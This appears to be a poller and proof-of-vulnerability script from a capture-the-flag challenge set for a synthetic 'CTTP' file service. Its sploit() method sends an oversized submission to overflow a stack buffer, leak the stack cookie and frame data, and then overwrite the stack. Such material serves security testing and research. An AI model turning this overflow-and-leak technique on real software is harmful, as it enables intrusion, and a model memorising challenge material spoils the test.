#!/usr/bin/env python
#
# Copyright (C) 2014 
#   Brian Caswell <bmc@lungetech.com>
#   Narf Industries <info@narfindustries.com>
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
import string
import sys
import os

from os.path import join,dirname,abspath
from generator.actions import Actions
from random import choice,randint
from struct import *

lehdr = "PTTC"
behdr = "CTTP"
INTERNALERR = "If anyone asks, you're my debugger.\x00"
SUBMITOK = "Oh, sure. Let the robot do all the work.\x00" 
DELETEOK = "Hopes: deleted.\x00"
NOTIMPLEMENTED = "You want me to do *two* things?!\x00"

INFO = 0x4347C000
WARN = 0x4347C001
ERROR = 0x4347C002

def random_alpha(a, b):
    return ''.join(choice(string.letters) for _ in range(randint(a, b)))

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

class CTTP(Actions):

    def start(self):
        self.files = {}

    def _retrieve(self, ver, code):
        le = True
        hdr = lehdr if le else behdr
        fmt = "<4sIIIIII" if le else ">4sIIIIII"

        path = random_alpha(10,100)

        body = "" 

        pkt = pack(fmt, hdr, ver, code, len(path), len(body), 0, 0) + path + body 

        fmt = "<4sII" if le else ">4sII"
        if path in self.files:
            body = self.files[path]
            code = 0xbaaaaaaa;
        else:
            body = INTERNALERR
            code = 0xbaaaaaab;

        return (pkt, pack(fmt, hdr, code, len(body)) + body)

    def _submit(self, ver, code, body):
        le = True
        hdr = lehdr if le else behdr
        fmt = "<4sIIIIII" if le else ">4sIIIIII"

        path = random_alpha(10,100)
        while path in self.files:
            path = random_alpha(10,100)

        pkt = pack(fmt, hdr, ver, code, len(path), len(body), 0, 0) + path + body 

        fmt = "<4sII" if le else ">4sII"
        self.files[path] = body
        code = 0xbaaaaaaa;
        body = SUBMITOK 

        return (pkt, pack(fmt, hdr, code, len(body)) + body)

    def _auth(self, ver, code):
        le = True
        hdr = lehdr if le else behdr
        fmt = "<4sIIIIII" if le else ">4sIIIIII"

        path = self.files.keys()[0]

        body = "" 

        pkt = pack(fmt, hdr, ver, code, len(path), len(body), 0, 0) + path + body 

        fmt = "<4sII" if le else ">4sII"

        #fixed in c file
        challenge = "temp"
        key = 0xff
        encoded = challenge
        token = 0xdeadbeef
        etoken = pack("<I",token)

        self.write(pkt)

        self.read(length=len(challenge)+5+4, expect=pack("<BI",key,len(challenge))+encoded+etoken)

        body = self.files[path]
        code = 0xbaaaaaaa;
        key = 0x00
        body = "".join(chr(ord(i)^key) for i in body)

        return (challenge+pack("<I",token^0x127a1b76), pack(fmt, hdr, code, len(body)) + body)

    def _quit(self, ver, code):
        le = True
        hdr = lehdr if le else behdr
        fmt = "<4sIIIIII" if le else ">4sIIIIII"

        path = ""

        body = "" 

        pkt = pack(fmt, hdr, ver, code, len(path), len(body), 0, 0) + path + body 

        resp = "done"

        return (pkt, resp)

    def do_auth(self):
        code = 0x41414141
        ver = 0x10000000
        le = True
        hdr = lehdr if le else behdr
        fmt = "<4sIIIIII" if le else ">4sIIIIII"

        path = random_alpha(10,100)
        body = "" 

        pkt = pack(fmt, hdr, ver, code, len(path), len(body), 0, 0) 

        fmt = "<4sII" if le else ">4sII"
        respbody = INTERNALERR
        respcode = 0xbaaaaaab;

        #fixed in c file
        challenge = "temp"
        key = 0xff
        encoded = challenge
        token = 0xdeadbeef
        etoken = pack("<I",token)

        self.write(pkt)

        self.read(length=len(challenge)+5+4, expect=pack("<BI",key,len(challenge))+encoded+etoken)
        self.write(challenge+pack("<I",token^0x127a1b76)+path+body)

        resp = pack(fmt, hdr, respcode, len(respbody)) + respbody
        self.read(length=len(resp), expect=resp)

    def sploit(self):
        self.do_auth()

        #will overwrite s, leaking out 28 extra bytes of stack,
        #encoded with single byte xor key from flag page
        req, resp = self._submit(0x10000000, 0x41414142, "A"*4096+pack("<I",4096+28))
        self.write(req)
        self.read(length=len(resp), expect=resp)

        #request file, leak stack cookie, valid fp, and valid cttpresp_t
        #decoding logic added in c
        req, resp = self._auth(0x10000002, 0x41414144)
        self.write(req)
        self.read(length=len(resp), expect=resp)

        #reset, hack because laziness
        self.files = {}

        #submit file to prove vulnerability
        req, resp = self._submit(0x10000000, 0x41414142,"A"*4096+pack("<I",4096)+"BBBBCCCCDDDDEEEEFFFF" + "SSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
        self.write(req)
        self.read(length=len(resp), expect=resp)

        #pwn
        req, resp = self._auth(0x10000002, 0x41414144)
        self.write(req)
        self.read(length=len(resp), expect=resp)

        #quit
        ver = 0x10000000
        req, resp = self._quit(ver, 0x41414146)
        self.write(req)
        self.read(length=len(resp), expect=resp)

    def quit(self):
        pass
